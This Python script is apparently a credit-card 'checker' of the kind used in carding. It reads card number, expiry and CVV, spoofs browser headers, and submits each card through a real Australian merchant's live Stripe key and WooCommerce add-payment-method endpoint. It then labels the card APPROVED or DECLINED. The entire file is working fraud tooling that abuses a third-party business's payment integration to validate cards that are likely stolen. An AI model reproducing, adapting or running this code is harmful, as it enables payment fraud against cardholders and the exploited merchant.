# qq.py
import requests
import re
import uuid
import time
from fake_useragent import UserAgent

def process_card(ccx):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "status": "DECLINED",
            "gateway": "Stripe Square [0.20$]"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

    # Step 1: Create payment method with Stripe
    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'IN',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/ebc1f502d5; stripe-js-v3/ebc1f502d5; payment-element; deferred-intent',
        'referrer': 'https://buildersdiscountwarehouse.com.au',
        'time_on_page': str(int(time.time())),
        'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
        'guid': str(uuid.uuid4()) + str(int(time.time())),
        'muid': stripe_mid,
        'sid': stripe_sid,
        'key': 'pk_live_51Q107x2KzKeWTXXpOywsGdTNQaEtZRRE9LKseUzC1oS3jOdQnP41co3ZYTIckSdqdv2DWOt8nnX469QiDEGacfzl00qHBbMx73',
        '_stripe_version': '2024-06-20'
    }

    stripe_headers = {
        'User-Agent': user_agent,
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site'
    }

    try:
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers=stripe_headers,
            timeout=10
        )
        pm_data = pm_response.json()

        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            return {"response": error_msg, "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}

        payment_method_id = pm_data['id']
    except Exception as e:
        return {"response": f"Payment Method Creation Failed: {str(e)}", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}

    # Step 2: Get nonce from the website
    cookies = {
        '__stripe_mid': stripe_mid,
        '__stripe_sid': stripe_sid,
    }

    headers = {
        'User-Agent': user_agent,
        'Referer': 'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
    }

    try:
        nonce_response = requests.get(
            'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
            headers=headers,
            cookies=cookies,
            timeout=10
        )

        if 'createAndConfirmSetupIntentNonce' in nonce_response.text:
            nonce = nonce_response.text.split('createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        else:
            return {"response": "Failed to extract nonce", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}
    except Exception as e:
        return {"response": f"Nonce Retrieval Failed: {str(e)}", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}

    # Step 3: Create and confirm setup intent
    params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }

    headers = {
        'User-Agent': user_agent,
        'Referer': 'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://buildersdiscountwarehouse.com.au',
        'x-requested-with': 'XMLHttpRequest',
    }

    try:
        setup_response = requests.post(
            'https://buildersdiscountwarehouse.com.au/',
            params=params,
            headers=headers,
            cookies=cookies,
            data=data,
            timeout=10
        )
        setup_data = setup_response.json()

        if setup_data.get('success', False):
            data_status = setup_data['data'].get('status')
            if data_status == 'requires_action':
                return {"response": "Thank You! for your donation", "status": "APPROVED", "gateway": "Stripe Square [0.20$]"}
            elif data_status == 'succeeded':
                return {"response": "Thank You! for your donation", "status": "APPROVED", "gateway": "Stripe Square [0.20$]"}
            elif 'error' in setup_data['data']:
                error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                return {"response": error_msg, "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}

        if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
            error_msg = setup_data['data']['error'].get('message', 'Unknown error')
            return {"response": error_msg, "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}

        return {"response": "Unknown response from gateway", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}

    except Exception as e:
        return {"response": f"Setup Intent Failed: {str(e)}", "status": "DECLINED", "gateway": "Stripe Square [0.20$]"}

def check_qq_card(cc):
    """Check Stripe Square status for a single card"""
    # Basic CC format validation
    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
        return {
            "response": "Invalid card format. Use CC|MM|YYYY|CVV",
            "status": "DECLINED",
            "gateway": "Stripe Square [0.20$]"
        }
    
    return process_card(cc)
